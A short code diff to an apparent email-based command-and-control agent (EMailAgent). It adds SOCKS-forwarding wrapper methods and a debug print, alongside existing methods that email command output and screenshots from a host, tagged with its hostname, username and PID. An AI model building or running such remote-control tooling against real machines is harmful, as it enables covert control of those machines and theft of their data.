@@ -57,6 +57,9 @@ class EMailAgent(LocalAgent):
 	def __init__(self):
 		LocalAgent.__init__(self)
 
+	def pushSocksForward(self, forwardID, data):
+		self.pushForward(forwardID, data)
+
 	def pushForward(self, forwardID, data):
 		if not forwardID in self.forwardQueues:
 			self.forwardQueues[forwardID] = queue.Queue()
@@ -79,6 +82,9 @@ class EMailAgent(LocalAgent):
 			#print("Oops, something went wrong in processNextEmail: {}".format(e), file=sys.stderr)
 			self.curlLock.release()
 			return "No email"
+
+	def pollSocksForward(self, forwardID):
+		return self.pollForward(forwardID)
 
 	def pollForward(self, forwardID):
 		if not forwardID in self.forwardQueues:
@@ -119,6 +125,7 @@ class EMailAgent(LocalAgent):
 		return os.path.realpath(__file__) 
         
 	def postResponse(self, cmd_output):
+		print("Sending: " + cmd_output)
 		self.sendEmail(self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG), cmd_output);
         
 	def postScreenshot(self, cmd_output):
